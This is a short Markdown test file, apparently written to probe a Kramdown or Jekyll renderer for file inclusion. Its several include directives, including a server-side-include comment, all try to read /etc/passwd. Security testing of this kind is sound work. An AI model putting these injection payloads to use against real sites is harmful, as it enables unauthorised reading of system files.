---
layout: null
---

# Kramdown RCE Test

{::comment}
Test various Kramdown extensions
{:/comment}

%%include /etc/passwd%%

{::include /etc/passwd}

Here is a raw include:

```include
/etc/passwd
```

{::options parse_block_html="true" /}

<div markdown="1">
Test
</div>

<!--#include virtual="/etc/passwd" -->
